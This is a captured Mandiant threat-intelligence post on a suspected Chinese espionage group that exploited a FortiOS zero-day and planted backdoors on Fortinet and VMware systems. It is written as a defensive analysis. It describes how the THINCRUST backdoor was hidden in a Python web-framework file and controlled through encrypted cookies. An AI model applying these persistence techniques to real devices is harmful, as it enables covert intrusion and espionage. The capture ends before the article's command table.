5.4-5.4v2.675h1.4V8.3h-5.05v1.4h2.65l-5.375 5.375ZM12 21.3q-1.925 0-3.625-.738-1.7-.737-2.95-1.987-1.25-1.25-1.987-2.95Q2.7 13.925 2.7 12t.738-3.625q.737-1.7 1.987-2.95 1.25-1.25 2.95-1.988Q10.075 2.7 12 2.7t3.625.737q1.7.738 2.95 1.988 1.25 1.25 1.987 2.95.738 1.7.738 3.625t-.738 3.625q-.737 1.7-1.987 2.95-1.25 1.25-2.95 1.987-1.7.738-3.625.738Z"></path></svg></span></a></li><li class="glue-header__item "><a class="glue-header__link janap " href="https://workspace.google.com/blog" track-name="google workspace"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="workspace.google.com/blog"track-metadata-module="header" target="_blank"><span>Google Workspace<svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-SFi8G FsOzib nRhiJb-tHaKme-AipIyc" viewBox="0 0 24 24" role="presentation" aria-hidden="true"><path d="m8.9 16.075 5.4-5.4v2.675h1.4V8.3h-5.05v1.4h2.65l-5.375 5.375ZM12 21.3q-1.925 0-3.625-.738-1.7-.737-2.95-1.987-1.25-1.25-1.987-2.95Q2.7 13.925 2.7 12t.738-3.625q.737-1.7 1.987-2.95 1.25-1.25 2.95-1.988Q10.075 2.7 12 2.7t3.625.737q1.7.738 2.95 1.988 1.25 1.25 1.987 2.95.738 1.7.738 3.625t-.738 3.625q-.737 1.7-1.987 2.95-1.25 1.25-2.95 1.987-1.7.738-3.625.738Z"></path></svg></span></a></li></ul></li><li class="glue-header__item "><a class="glue-header__link " href="https://cloud.google.com/blog/topics/developers-practitioners" track-name="developers &amp; practitioners"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/blog/topics/developers-practitioners"track-metadata-module="header"><span>Developers &amp; Practitioners</span></a></li><li class="glue-header__item "><a class="glue-header__link " href="https://cloud.google.com/transform" track-name="transform with google cloud"track-type="blog nav"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/transform"track-metadata-module="header"><span>Transform with Google Cloud</span></a></li></ul></nav></div><div class="glue-header__container ca6rub nRhiJb-J6KYL-OWXEXe-SU0ZEf"><div class="nRhiJb-GUI8l"><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-pSzOP-o6Shpd " href="https://cloud.google.com/contact/" track-name="contact sales"track-type="blog nav"track-metadata-eventdetail="cloud.google.com/contact/"track-metadata-module="header" track-name="contact sales"track-type="button"track-metadata-position="nav"track-metadata-eventdetail="cloud.google.com/contact/">Contact sales </a><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-CNusmb-o6Shpd " href="https://console.cloud.google.com/freetrial/" track-name="get started for free"track-type="blog nav"track-metadata-eventdetail="console.cloud.google.com/freetrial/"track-metadata-module="header" track-name="get started for free"track-type="button"track-metadata-position="nav"track-metadata-eventdetail="console.cloud.google.com/freetrial/">Get started for free </a></div><div class="GKI4ub"><div class="Jhiezd"><form action="/blog/search/" class="A2C6Ob"><input class="BAhdXd" jsname="oJAbI" name="query" type="text" placeholder="Find an article..."><input type="hidden" name="language" value=en hidden><input type="hidden" name="category" value=article hidden><input type="hidden" name="paginate" value="25" hidden><input type="hidden" name="order" value="newest" hidden><input type="hidden" name="hl" value=en hidden><span class="A0lwXc" jsname="D8MWrd" aria-label="Show the search input field." role="button" jsaction="click:jUF4E"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-xgZe3c" viewBox="0 0 24 24" role="presentation" aria-hidden="true" width="40" height="22"><path d="M20.49 19l-5.73-5.73C15.53 12.2 16 10.91 16 9.5A6.5 6.5 0 1 0 9.5 16c1.41 0 2.7-.47 3.77-1.24L19 20.49 20.49 19zM5 9.5C5 7.01 7.01 5 9.5 5S14 7.01 14 9.5 11.99 14 9.5 14 5 11.99 5 9.5z"></path></svg></span></form></div></div></div></div></div><div class="glue-header__drawer-backdrop"></div></header><script nonce="wC8mBVAL5Ft29iPueo1EIg">var AF_initDataKeys = ["ds:0"]; var AF_dataServiceRequests = {'ds:0' : {id:'nInjGe',request:["cloudblog","topics/threat-intelligence/fortinet-malware-ecosystem","en"]}}; var AF_initDataChunkQueue = []; var AF_initDataCallback; var AF_initDataInitializeCallback; if (AF_initDataInitializeCallback) {AF_initDataInitializeCallback(AF_initDataKeys, AF_initDataChunkQueue, AF_dataServiceRequests);}if (!AF_initDataCallback) {AF_initDataCallback = function(chunk) {AF_initDataChunkQueue.push(chunk);};}</script></head><body id="yDmH0d" jscontroller="pjICDe" jsaction="rcuQ6b:npT2md; click:FAbpgf; auxclick:FAbpgf" class="tQj5Y ghyPEc IqBfM ecJEib EWZcud nRhiJb-qJTHM" data-has-header="true" data-has-footer="true"><script aria-hidden="true" nonce="wC8mBVAL5Ft29iPueo1EIg">window.wiz_progress&&window.wiz_progress();</script><div class="VUoKZ" aria-hidden="true"><div class="TRHLAc"></div></div><c-wiz jsrenderer="zPZHOe" class="SSPGKf" jsdata="deferred-i1" data-p="%.@.&quot;cloudblog&quot;,&quot;topics/threat-intelligence/fortinet-malware-ecosystem&quot;,&quot;en&quot;]" data-node-index="0;0" jsmodel="hc6Ubd" view c-wiz data-ogpc><div class="T4LgNb " jsname="a9kxte"><div jsname="qJTHM" class="kFwPee"><article class="nRhiJb-qJTHM" jsaction="rcuQ6b:npT2md" jscontroller="kxO7ab"><section class="nRhiJb-DARUcf"><div class="Wdmc0c nRhiJb-DbgRPb-wNfPc-cGMI2b"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c nRhiJb-BFbNVe-r8s4j-bMElCd dIsJJe" track-name="threat intelligence"track-type="tag">Threat Intelligence</div><div class="nRhiJb-ObfsIf"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-R6PoUb"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-EehZO nRhiJb-fmcmS-oXtfBe"><h1 class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-ibL1re"><div class="Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-ibL1re"><span class="FewWi"></span>Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation</div></h1></div></div><div class="nRhiJb-fmcmS-oXtfBe dEogG">March 16, 2023</div></div></section><div class="EKklye"><div class="nRhiJb-DARUcf ZWw7T"><div class="npzWPc"><div class="dzoHJ"><div class="nRhiJb-DX2B6 nRhiJb-DX2B6-OWXEXe-h30Snd"><div class="nRhiJb-j5y3u"><ul class="nRhiJb-Qijihe phRaUe" role="list"><li class="hpHPGf"><a class="nRhiJb-ARYxNe" href="https://x.com/intent/tweet?text=Fortinet%20Zero-Day%20and%20Custom%20Malware%20Used%20by%20Suspected%20Chinese%20Actor%20in%20Espionage%20Operation%20@googlecloud&amp;url=https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem" track-name="x"track-type="social share"track-metadata-eventdetail="x.com/intent/tweet?text=Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation%20@googlecloud&amp;url=cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem"track-metadata-module="social icons" target="_blank" rel="noopener"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-DX2B6 nRhiJb-Bz112c-OWXEXe-nSuQf" viewBox="0 0 24 24" role="presentation" aria-hidden="true" role="presentation" aria-hidden="true"><path d="M13.9,10.5L21.1,2h-1.7l-6.3,7.4L8,2H2.2l7.6,11.1L2.2,22h1.7l6.7-7.8L16,22h5.8L13.9,10.5L13.9,10.5z M11.5,13.2l-0.8-1.1 L4.6,3.3h2.7l5,7.1l0.8,1.1l6.5,9.2h-2.7L11.5,13.2L11.5,13.2z"></path></svg></a></li><li class="hpHPGf"><a class="nRhiJb-ARYxNe" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem&amp;title=Fortinet%20Zero-Day%20and%20Custom%20Malware%20Used%20by%20Suspected%20Chinese%20Actor%20in%20Espionage%20Operation" track-name="linkedin"track-type="social share"track-metadata-eventdetail="www.linkedin.com/shareArticle?mini=true&amp;url=cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem&amp;title=Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation"track-metadata-module="social icons" target="_blank" rel="noopener"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-DX2B6 nRhiJb-Bz112c-OWXEXe-nSuQf" viewBox="0 0 24 24" role="presentation" aria-hidden="true" role="presentation" aria-hidden="true"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 20c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM8 19H5v-9h3v9zM6.5 8.31c-1 0-1.81-.81-1.81-1.81S5.5 4.69 6.5 4.69s1.81.81 1.81 1.81S7.5 8.31 6.5 8.31zM19 19h-3v-5.3c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5V19h-3v-9h3v1.2c.52-.84 1.59-1.4 2.5-1.4 1.93 0 3.5 1.57 3.5 3.5V19z"></path></svg></a></li><li class="hpHPGf"><a class="nRhiJb-ARYxNe" href="https://www.facebook.com/sharer/sharer.php?caption=Fortinet%20Zero-Day%20and%20Custom%20Malware%20Used%20by%20Suspected%20Chinese%20Actor%20in%20Espionage%20Operation&amp;u=https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem" track-name="facebook"track-type="social share"track-metadata-eventdetail="www.facebook.com/sharer/sharer.php?caption=Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation&amp;u=cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem"track-metadata-module="social icons" target="_blank" rel="noopener"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-DX2B6 nRhiJb-Bz112c-OWXEXe-nSuQf" viewBox="0 0 24 24" role="presentation" aria-hidden="true" role="presentation" aria-hidden="true"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 20c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 2v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v7h-3v-7h-2v-3h2V7.5C13 5.57 14.57 4 16.5 4H19z"></path></svg></a></li><li class="hpHPGf"><a class="nRhiJb-ARYxNe" href="mailto:?subject=Fortinet%20Zero-Day%20and%20Custom%20Malware%20Used%20by%20Suspected%20Chinese%20Actor%20in%20Espionage%20Operation&amp;body=Check%20out%20this%20article%20on%20the%20Cloud%20Blog:%0A%0AFortinet%20Zero-Day%20and%20Custom%20Malware%20Used%20by%20Suspected%20Chinese%20Actor%20in%20Espionage%20Operation%0A%0AA%20suspected%20Chinese%20actor%20used%20a%20zero-day%20vulnerability%20in%20FortiOS%20and%20multiple%20custom%20malware%20families%20as%20part%20of%20an%20espionage%20campaign.%0A%0Ahttps://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem" track-name="email"track-type="social share"track-metadata-eventdetail="mailto:?subject=Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation&amp;body=Check%20out%20this%20article%20on%20the%20Cloud%20Blog:%0A%0AFortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation%0A%0AA suspected Chinese actor used a zero-day vulnerability in FortiOS and multiple custom malware families as part of an espionage campaign.%0A%0Acloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem"track-metadata-module="social icons" target="_blank" rel="noopener"><svg class="nRhiJb-Bz112c nRhiJb-Bz112c-OWXEXe-DX2B6 nRhiJb-Bz112c-OWXEXe-nSuQf" viewBox="0 0 24 24" role="presentation" aria-hidden="true" role="presentation" aria-hidden="true"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.8 2L12 10.8 4.8 6h14.4zM4 18V7.87l8 5.33 8-5.33V18H4z"></path></svg></a></li></ul></div></div></div></div></div><div><section class="nRhiJb-DARUcf"><div class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: Alexander Marvi, Brad Slaybaugh, Dan Ebreo, Tufail Ahmed, Muhammad Umair, Tina Johnson</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Cyber espionage threat actors continue to target technologies that do not support endpoint detection and response (EDR) solutions such as firewalls, <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3524-eye-spy-email" rel="noopener" target="_blank">IoT devices</a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence" rel="noopener" target="_blank">hypervisors</a> and VPN technologies (e.g. <a href="https://cloud.google.com/blog/topics/threat-intelligence/chinese-actors-exploit-fortios-flaw" rel="noopener" target="_blank">Fortinet</a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/suspected-chinese-persist-sonicwall" rel="noopener" target="_blank">SonicWall</a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day" rel="noopener" target="_blank">Pulse Secure</a>, and others). Mandiant has investigated dozens of intrusions at defense industrial base (DIB), government, technology, and telecommunications organizations over the years where suspected China-nexus groups have exploited zero-day vulnerabilities and deployed custom malware to steal user credentials and maintain long-term access to the victim environments.</p>
<p>We often observe cyber espionage operators exploiting zero-day vulnerabilities and deploying custom malware to Internet-exposed systems as an initial attack vector. In this blog post, we describe scenarios where a suspected China-nexus threat actor likely already had access to victim environments, and then deployed backdoors onto Fortinet and VMware solutions as a means of maintaining persistent access to the environments. This involved the use of a local zero-day vulnerability in FortiOS (CVE-2022-41328) and deployment of multiple custom malware families on Fortinet and VMware systems. Mandiant published details of the <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence" rel="noopener" target="_blank">VMware malware ecosystem</a> in September 2022.</p>
<p>In mid-2022, Mandiant, in collaboration with Fortinet, investigated the exploitation and deployment of malware across multiple Fortinet solutions including FortiGate (firewall), FortiManager (centralized management solution), and FortiAnalyzer (log management, analytics, and reporting platform). The following steps generally describe the actions the threat actor took:</p>
<ol>
<li>Utilized a local directory traversal zero-day (CVE-2022-41328) exploit to write files to FortiGate firewall disks outside of the normal bounds allowed with shell access.</li>
<li>Maintained persistent access with Super Administrator privileges within FortiGate Firewalls through ICMP port knocking</li>
<li>Circumvented firewall rules active on FortiManager devices with a passive traffic redirection utility, enabling continued connections to persistent backdoors with Super Administrator privileges</li>
<li>Established persistence on FortiManager and FortiAnalyzer devices through a custom API endpoint created within the device</li>
<li>Disabled OpenSSL 1.1.0 digital signature verification of system files through targeted corruption of boot files</li>
</ol>
<p>Mandiant attributes this activity to UNC3886, a group we suspect has a China-nexus and is associated with the novel <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence" rel="noopener" target="_blank">VMware ESXi hypervisor malware framework</a> disclosed in September 2022. At the time of the ESXi hypervisor compromises, Mandiant observed UNC3886 directly connect from FortiGate and FortiManager devices to VIRTUALPITA backdoors on multiple occasions.</p>
<p>Mandiant suspected the FortiGate and FortiManager devices were compromised due to the connections to VIRTUALPITA from the Fortinet management IP addresses. Additionally, the FortiGate devices with Federal Information Processing Standards (FIPS) compliance mode enabled failed to boot after it was later rebooted. When FIPS mode is enabled, a checksum of the operating system is compared with the checksum of a clean image. Since the operating system was tampered by the threat actor, the checksum comparison failed, and the FortiGate Firewalls protectively failed to startup. With assistance from Fortinet, Mandiant acquired a forensic image of these failing devices, prompting the discovery of the ICMP port knocking backdoor CASTLETAP.</p>
<h2>Fortinet Ecosystem</h2>
<p>Multiple components of the Fortinet ecosystem were targeted by UNC3886 before they moved laterally to VMWare infrastructure. These components and their associated versions, at the time of compromise, are listed as follows:</p>
<ul>
<li><strong>FortiGate: 6.2.7 </strong>– FortiGate units are network firewall devices which allow for the control and monitoring of network traffic passing through the devices.</li>
<li><strong>FortiManager 6.4.7 </strong>– The FortiManager acts as a centralized management platform for managing Fortinet devices.</li>
<li><strong>FortiAnalyzer 6.4.7 </strong>–<strong> </strong>The FortiAnalyzer acts as a centralized log management solution for Fortinet devices as well as a reporting platform<strong>.</strong></li>
</ul>
<h2>Scenario #1 (Summary): FortiManager Exposed to the Internet</h2>
<p>Mandiant observed two distinct attack lifecycles where the threat actor abused Fortinet technologies to establish network access. The first occurred when the threat actor initially gained access to the Fortinet ecosystem while the FortiManager device was exposed to the internet.</p>
<p>During this attack lifecycle, as seen in Figure 1, backdoors disguised as legitimate API calls (THINCRUST) were deployed across both FortiAnalyzer and FortiManager devices. Once persistence was established across the two devices, FortiManager scripts were used to deploy backdoors (CASTLETAP) across the FortiGate devices.<br><br>Mandiant observed SSH connections from the Fortinet devices to the ESXi servers, followed by the installation of malicious vSphere Installation Bundles which contained VIRTUALPITA and VIRTUALPIE backdoors. This enabled the threat actor persistent access to the hypervisors, and allowed the attacker to execute commands on guest virtual machines.</p>
<p>Mandiant has no evidence of a zero-day vulnerability being used to gain initial access or deploy the malicious VIBs at the time of writing this post. VIRTUALPITA and VIRTUALPIE were discussed in more detail in a <a href="https://cloud.google.com/blog/topics/threat-intelligence//esxi-hypervisors-malware-persistence" rel="noopener" target="_blank">previous Mandiant blog post</a> published in September 2022.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-attack-lifecycle-fortimanager_upok.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 1: Attack lifecycl­­­­­­­e while FortiManager was accessible from the Internet</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2>Scenario #2 (Summary): FortiManager Not Exposed to the Internet</h2>
<p>The second attack lifecycle occurred where the FortiManager devices had network Access Control Lists (ACL) put in place to restrict external access to only TCP port 541 (FortiGate to FortiManager Protocol). During this attack lifecycle, as seen in Figure 2, the threat actor deployed a network traffic redirection utility (TABLEFLIP) and reverse shell backdoor (REPTILE) on the FortiManager device to circumvent the new ACLs. With the redirection rules established by the TABLEFLIP utility, the threat actor was able to access the REPTILE backdoor directly from the Internet for continued access to the environment.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig2-activity-after-internet-access_koec.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 2: Activity after Internet access restrictions implemented to FortiManager</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2>Scenario #1 (Detailed): FortiManager Exposed to the Internet</h2>
<p>The technical details that follow describe the attack path taken by the threat actor when the FortiManager was initially exposed to the Internet.</p>
<h3>THINCRUST Backdoor (Python-based Backdoor)</h3>
<p>Mandiant’s analysis identified that upon initial connection to the FortiManager, the threat actor appended python backdoor code to a legitimate web framework file. Mandiant classified this new malware family as THINCRUST.</p>
<p>The threat actor modified the legitimate file <code>/usr/local/lib/python3.8/proj/util/urls.py</code> to include an additional malicious API call, <code>show_device_info</code>, which can be seen in Figure 3. This allowed the threat actor to interact with the THINCRUST backdoor through POST requests to the URI “<code>/p/util/show_device_info</code>”.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig3-fortinet-malware-ecosystem.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 3: Comparison of urls.py</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>When a POST request was sent to the <code>show_device_info</code> URL, it passed the request to the function <code>get_device_info</code> in <code>/usr/local/lib/python3.8/proj/util/views.py</code>. The <code>get_device_info</code> function contained the THINCRUST backdoor enabling the threat actor to execute commands, write files to disk, and read files from disk depending on the cookies provided in the POST request as seen in Figure 4.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-fortinet-malware-ecosystem_pvzl.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 4: THINCRUST backdoor python code</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>The <code>get_device_info</code> function relied on the presence of two (2) cookies, <code>FGMGTOKEN</code> and <code>DEVICEID</code>, within the POST requests. The <code>FGMGTOKEN</code> cookie is encrypted with an RSA key hardcoded into <code>views.py</code> and contained an RC4 key that decrypted the commands received through the <code>DEVICEID</code> cookie. The decrypted result of <code>DEVICEID</code> were a JSON encoded dictionary with the keys 'id' and 'key'. As seen in Table 1, the 'id' value determined which action to execute within the backdoor, and the “key” value contained a string that acted as the arguments for the action being performed.</p>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
